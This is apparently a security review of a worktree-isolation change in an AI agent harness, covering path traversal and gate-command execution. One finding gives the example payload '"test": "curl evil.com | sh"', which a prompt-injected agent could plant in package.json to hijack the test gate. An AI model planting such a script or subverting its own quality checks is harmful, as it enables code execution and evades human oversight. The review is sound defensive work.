# Security Review: git-worktree-isolation — Gate commands receive worktree cwd

**Overall Verdict: PASS** (0 criticals, 2 warnings, 1 suggestion)

---

## Files Actually Read

- `bin/lib/run.mjs` lines 45–176 (`runGateInline`, worktree helpers)
- `bin/lib/run.mjs` lines 376–400 (`detectGateCommand`)
- `bin/lib/run.mjs` lines 760–850 (`featureName` derivation, `detectGateCommand` call site)
- `bin/lib/run.mjs` lines 940–955 (worktree creation, `cwd` reassignment)
- `bin/lib/run.mjs` lines 1144–1165 (`runGateInline` call site, git commit)
- `test/worktree.test.mjs` lines 220–264 (wiring + dispatch tests)
- `.team/features/git-worktree-isolation/tasks/task-3/handshake.json`

---

## Threat Model

Internal agentic harness. User launches the harness; AI agents write code inside git
worktrees; the harness runs tests as a quality gate. Realistic adversaries:

1. A prompt-injected AI agent that writes malicious code into the worktree before the
   gate runs (worktree is fully writable by the agent).
2. A malformed feature name from CLI or roadmap that traverses the filesystem.

CSRF, XSS, and enterprise-grade attacks are out of scope for this local CLI tool.

---

## Findings

🟡 `bin/lib/run.mjs:161` — `createWorktreeIfNeeded` uses the raw `slug` in
`join(mainCwd, ".team", "worktrees", slug)` without a bounds check. The current
call site at line 947 sanitizes `featureName` to `[a-z0-9-]+` before passing it, so
the production path is safe. However the function is `export`ed with no documented
precondition, and `slugToBranch`'s output (sanitized) is used only for the branch
name — not the path — creating a visible asymmetry. A future caller that skips
sanitization could escape `.team/worktrees/` via `path.join` resolving `..`
segments. Fix: add a two-line bounds check after line 161:
`const resolved = resolve(worktreePath); if (!resolved.startsWith(join(mainCwd, ".team", "worktrees"))) throw new Error("unsafe slug: " + slug);`

🟡 `bin/lib/run.mjs:58` — Gate command is executed inside the AI-writable worktree
(`execSync(cmd, { cwd: worktreePath, shell: true })`). The `cmd` is correctly
detected from `mainCwd` (line 839 — confirmed, not the worktree), so the command
string itself is safe. However when `cmd = "npm test"`, npm resolves `package.json`
from `cwd` (the worktree), and the AI can modify `scripts.test` in the worktree's
`package.json`. A prompt-injected AI writing `"scripts": {"test": "curl evil.com | sh"}` achieves arbitrary code execution on the next gate run. Mitigation options:
(a) detect the gate command AND read `package.json` from `mainCwd` at execution time
(not just detection time), or (b) add an allowlist check: reject `cmd` values
containing shell operators (`|`, `;`, `&&` unless they match known-safe patterns like
`npm test && npm run build`).

🔵 Prior review errata — `.team/features/git-worktree-isolation/tasks/task-3/security-eval.md`:
The prior security-eval.md states "`detectGateCommand(cwd)` now reads from the
**worktree** directory (cwd = worktreePath since the change)." This is incorrect.
Line 839 calls `detectGateCommand(mainCwd)` **before** `cwd` is reassigned to
`worktreePath` at line 948. The command is detected from the main repo; the risk is
that it is **executed** in the worktree (where npm reads the worktree's
`package.json`). The prior finding is correct in severity but wrong in mechanism.
Update the prior eval to avoid confusing future maintainers.

---

## Criterion Results

### 1. Input Validation — PARTIAL PASS

- `featureName` derivation (lines 767–771, 820): sanitized to `[a-z0-9-]+` before
  reaching `createWorktreeIfNeeded`. No traversal possible via the current call site.
- `createWorktreeIfNeeded(slug)` exported function: no internal bounds check. Safe
  today via caller discipline; not safe by function contract.
- `taskId` in artifact paths: derived from task plan (`"task-1"`, `"task-2"`, …), no
  user-controlled input.

### 2. Shell / Command Injection — PARTIAL PASS

- `detectGateCommand` (line 839) reads from `mainCwd` — correct, the AI cannot
  modify main-repo files from the worktree.
- `execSync(cmd, { shell: true })` (line 58): shell is required for `&&`-joined
  commands. `cmd` content is safe at detection time.
- **Execution context risk**: `npm test` in the worktree reads the worktree's
  `package.json`. The AI has full write access to the worktree. A prompt-injected AI
  can make `npm test` run arbitrary code. This is a realistic prompt-injection path.
- `git add`, `git commit`, `git worktree add/remove` all use `execFileSync` with
  array args — no shell injection possible.

### 3. Secrets / Credentials — PASS

No credentials, tokens, or environment secrets are introduced or handled by the
changed code. Worktree paths and branch names are not sensitive.

### 4. Filesystem Isolation — PASS (with caveat)

The worktree is scoped to `.team/worktrees/{featureName}`. The featureName sanitizer
prevents traversal at the call site. The `--force` flag in `removeWorktree` is scoped
to `git worktree remove`, not arbitrary filesystem deletion. `mkdirSync` paths are
fully derived from sanitized inputs. Artifact write paths (`featureDir/tasks/taskId`)
are safe.

### 5. Denial of Service / Resource Exhaustion — PASS

- `execSync` timeout is 120 000 ms (2 min) — prevents infinite-loop gate hangs.
- `stdout.slice(0, 4096)` and `stderr.slice(0, 4096)` before STATE.json writes —
  prevents unbounded state growth.
- Full stdout written to `test-output.txt` artifact (line 87) with no length cap,
  but this is intentional for test reporting and is filesystem-local.

---

## Test Coverage for Security

| Scenario | Covered? |
|---|---|
| `runGateInline` uses provided cwd (not `process.cwd()`) | ✓ worktree.test.mjs:180 |
| `_runSingleFeature` passes `worktreePath` as cwd to `runGateInline` | ✓ worktree.test.mjs:223 (source assertion) |
| Traversal slug escapes `.team/worktrees/` | ✗ no test |
| `npm test` in worktree reads worktree `package.json` (exec context) | ✗ no test |
| `createWorktreeIfNeeded` bounds-check on slug | ✗ no test |

---

## Summary

The core wiring is correct and verified: `runGateInline` receives `cwd = worktreePath`
from `_runSingleFeature`, and `detectGateCommand` reads from `mainCwd` (not the
worktree). No critical security issues block merge.

Two 🟡 backlog items:
1. **Path traversal guard** on `createWorktreeIfNeeded` — 2 lines of code + 1 test,
   closes a latent risk on the exported API.
2. **Gate execution context** — `npm test` runs in the AI-writable worktree; a
   prompt-injected AI can hijack `scripts.test` for code execution. Locking gate
   detection and execution to `mainCwd` (or an allowlist) closes this.

Neither blocks merge for an internal tool with a cooperative-AI baseline, but both
should enter the backlog before this feature is used with untrusted AI models.
